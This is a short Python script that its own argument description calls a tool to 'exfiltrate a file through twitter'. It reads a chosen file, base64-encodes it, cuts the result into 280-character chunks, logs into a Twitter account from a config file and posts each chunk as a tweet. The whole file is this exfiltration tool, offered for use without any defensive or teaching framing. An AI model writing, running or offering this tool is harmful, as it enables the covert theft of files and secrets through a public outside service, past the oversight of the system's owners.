import os
import sys
import json
import argparse
import base64
from Twitter import Twitter

# Command line arguments
def get_arguments():
  parser = argparse.ArgumentParser(description='Exfiltrate a file through twitter')
  parser.add_argument("--config", help="Required configuration file", required=True)
  parser.add_argument("--source", help="Hint: only Twitter works right now")
  parser.add_argument("--file", help="Specify a file to send")

  return parser.parse_args()

# Loads the configuration file and parses the json file
def load_configuration_file(config_path):
  if os.path.exists(config_path):
    with open(config_path, "rb") as config_file:
      try:
        return json.load(config_file)
      except IOError:
        print("Could not read file {:s}".format(config_path))
        sys.exit(-1)

# Opens a file and converts it to a base64 string
def file_to_base64(file_path):
  if os.path.exists(file_path):
    with open(file_path, "rb") as secret_file:
      try:
        return base64.b64encode(secret_file.read())
      except IOError:
        print("Could not read file {:s}".format(file_path))
        sys.exit(-1)

  else:
    print("Could not file the file {:s}".format(file_path))
    sys.exit(-1)

# Parses a string by the amount of characters allowed in a tweet
def parse_string_for_twitter(string):
  max_characters = 280
  return [string[i:i+max_characters] for i in range(0, len(string), max_characters)]

# Logs in to Twitter and tweets encoded message
def tweet_data(config, parsed_string):
  twitter_credentials = config['twitter']
  twitter_session = Twitter()
  twitter_session.login(twitter_credentials['username'], twitter_credentials['password'])

  num_tweets = len(parsed_string)
  count = 1

  for tweet in parsed_string:
    print("sending tweet {}/{}".format(count, num_tweets))
    twitter_session.tweet(tweet)
    count = count + 1

### MAIN ###
def main():
  args = get_arguments()
  config = load_configuration_file(args.config)

  if args.file:
    string_to_send = file_to_base64(args.file)
    print("Converted file to base64...")
  else:
    string_to_send = raw_input("Message to tweet: ")

  parsed_string = parse_string_for_twitter(string_to_send)
  print("Parsed the string for Twitters character limit")

  tweet_data(config, parsed_string)
  print("Data has been sent")

if __name__== "__main__":
  main()
